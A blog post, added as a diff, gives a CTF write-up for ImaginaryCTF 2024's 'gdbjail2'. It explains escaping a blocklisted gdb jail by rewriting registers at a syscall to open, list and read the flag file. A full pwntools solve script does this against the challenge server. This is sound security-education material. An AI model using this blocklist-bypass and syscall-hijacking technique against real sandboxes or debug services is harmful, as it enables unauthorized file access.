@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>gdbjail2 - ImaginaryCTF 2024 | shafouz blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="gdbjail2 - ImaginaryCTF 2024" />
+<meta name="author" content="shafouz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://ctftime.org/event/2396" />
+<meta property="og:description" content="https://ctftime.org/event/2396" />
+<link rel="canonical" href="https://shafouz.github.io/2024/07/21/gdbjail2.html" />
+<meta property="og:url" content="https://shafouz.github.io/2024/07/21/gdbjail2.html" />
+<meta property="og:site_name" content="shafouz blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-21T04:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="gdbjail2 - ImaginaryCTF 2024" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"shafouz"},"dateModified":"2024-07-21T04:00:00+00:00","datePublished":"2024-07-21T04:00:00+00:00","description":"https://ctftime.org/event/2396","headline":"gdbjail2 - ImaginaryCTF 2024","mainEntityOfPage":{"@type":"WebPage","@id":"https://shafouz.github.io/2024/07/21/gdbjail2.html"},"url":"https://shafouz.github.io/2024/07/21/gdbjail2.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://shafouz.github.io/feed.xml" title="shafouz blog" />
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-F6L4J94HSJ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-F6L4J94HSJ');
+  </script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">shafouz blog</a></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">gdbjail2 - ImaginaryCTF 2024</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-07-21T04:00:00+00:00" itemprop="datePublished">
+        Jul 21, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>https://ctftime.org/event/2396</p>
+
+<h1 id="gdbjail2-misc">gdbjail2 (misc)</h1>
+
+<p>this time with a blocklist</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>The main difference in this one is the blacklist:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"p"</span><span class="p">,</span> <span class="s">"-"</span><span class="p">,</span> <span class="s">"&amp;"</span><span class="p">,</span> <span class="s">"("</span><span class="p">,</span> <span class="s">")"</span><span class="p">,</span> <span class="s">"["</span><span class="p">,</span> <span class="s">"]"</span><span class="p">,</span> <span class="s">"{"</span><span class="p">,</span> <span class="s">"}"</span><span class="p">,</span> <span class="s">"0x"</span><span class="p">]</span>
+</code></pre></div></div>
+<p>So we can’t just set $rip.</p>
+
+<p>We are debugging cat without any arguments, so it just hangs there forever waiting for input.
+It takes input using the read syscall.
+We can just add a breakpoint before read, change the registers and continue.
+Allowing us to call any syscall that we want.</p>
+
+<p>The way to find where the syscall is might be a little bit harder, I just
+installed pwndbg on the Docker image, and used <code class="language-plaintext highlighter-rouge">stepuntilasm syscall</code>.
+But you can also step to it or use a custom gdb script.</p>
+
+<p>You can probably just call execve and be done with it.
+I unfortunately chose a harder path.</p>
+
+<ol>
+  <li>open flag dir</li>
+  <li>call opendents</li>
+  <li>read flag filename</li>
+  <li>open flag</li>
+  <li>read flag</li>
+  <li>print flag from mem</li>
+</ol>
+
+<p>Its pretty straight forward, there are two problems though.</p>
+
+<p>First, The flag filename has the letter ‘p’ in it which is on the blacklist.
+We can bypass that by using integers instead of chars, see the <code class="language-plaintext highlighter-rouge">alloc_str</code> function.</p>
+
+<p>And second, finding writeable memory
+We can just do <code class="language-plaintext highlighter-rouge">set $rax = "AAAA"</code>.
+This gives us a heap string of any size we want.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">sendfile</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">fd2</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 40"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd1</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="si">{</span><span class="n">fd2</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = 0"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $r10 = 64"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rdi = 1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="s">'B'</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $r14 = 65535 * </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $si = $si + $r14"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = 256"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[3]: clean.py:16: p.recv()=</span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">data</span> 
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">_open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 2"</span><span class="p">)</span>
+    <span class="n">alloc_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"$rdi"</span><span class="p">)</span>
+    <span class="c1"># p.sendlineafter(b"(gdb) ", f"set $rdi = \"{filename}\"".encode())
+</span>    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = 0"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">getdents</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 78"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">256</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 0"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="s">'A'</span><span class="o">*</span><span class="n">n</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">alloc_str</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = </span><span class="se">\"</span><span class="si">{</span><span class="s">'A'</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $start = </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set *</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = </span><span class="si">{</span><span class="n">chunk</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> + 1"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set *</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = 0"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = $start"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">with</span> <span class="n">remote</span><span class="p">(</span><span class="s">"gdbjail2.chal.imaginaryctf.org"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">":25</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"break *write+21"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"break *write+23"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">""</span><span class="p">)</span>
+
+    <span class="n">_open</span><span class="p">(</span><span class="s">"."</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+
+    <span class="n">getdents</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+    
+    <span class="n">data</span> <span class="o">=</span> <span class="n">dump</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s">'.txt'</span><span class="p">)</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">idx</span><span class="o">-</span><span class="mi">20</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+
+    <span class="n">_open</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+    
+    <span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+    
+    <span class="n">dump</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">ictf{i_l0ve_syscalls_eebc5336}</code></p>
+
+<p>shafouz 2024/07/21</p>
+
+  </div><a class="u-url" href="/2024/07/21/gdbjail2.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://shafouz.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">shafouz</li>
+          <li><a class="u-email" href="mailto:jlmacedomatos@gmail.com">contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://hackerone.com/shafou" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://github.com/shafouz" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/shafouzzzzzz" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/joao-luca/" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
